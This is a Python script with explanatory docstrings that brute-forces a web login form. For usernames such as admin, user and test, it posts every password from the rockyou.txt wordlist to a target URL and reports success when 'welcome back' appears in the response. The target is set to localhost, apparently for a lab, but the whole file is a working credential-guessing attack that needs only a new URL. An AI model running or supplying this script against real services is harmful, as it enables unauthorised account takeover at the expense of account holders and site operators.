import requests
import sys

"""
Brute-force web login using a small username set and a wordlist.
For each username, iterates through `rockyou.txt`, posts credentials to the target,
and detects success by searching for a known marker in the response body.

Modules:
- requests: HTTP client for POSTing login attempts.
- sys: Used for stdout progress printing and exiting the script.

Configuration:
- target: Login endpoint URL.
- usernames: Candidate usernames to test.
- passwords: Path to the password wordlist (note: the code below currently hardcodes 'rockyou.txt').
- needle: Marker string that indicates a successful login when present in the HTTP response body.

Usage:
    python script.py
"""

target = "http://127.0.0.1:5000"
usernames = {"admin", "user", "test"}
passwords = "rockyou.txt"
needle = "welcome back"

# === Credential Brute-Force Loop ===
for username in usernames:
    """
    For each username:
    - Open the password wordlist.
    - Try each password against the target.
    - Print a single-line status with carriage return to show progress.
    - On success, print result and exit immediately.
    - If the list is exhausted with no match, print a 'not found' message for this user.
    """
    with open("rockyou.txt", "r") as passwords_list:
        for password in passwords_list:
            # Strip newline and encode to bytes for raw submission (server-dependent).
            password = password.strip("\n").encode()

            # In-place progress line (overwritten each attempt)
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()

            # HTTP POST with form data: username + password
            r = requests.post(target, data={"username": username, "password": password})

            # Success detection via marker string in response body
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>>] Valid  '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()

    # If we got here, no password matched for this username
    sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.write("\tNo password found for '{}'!".format(username))
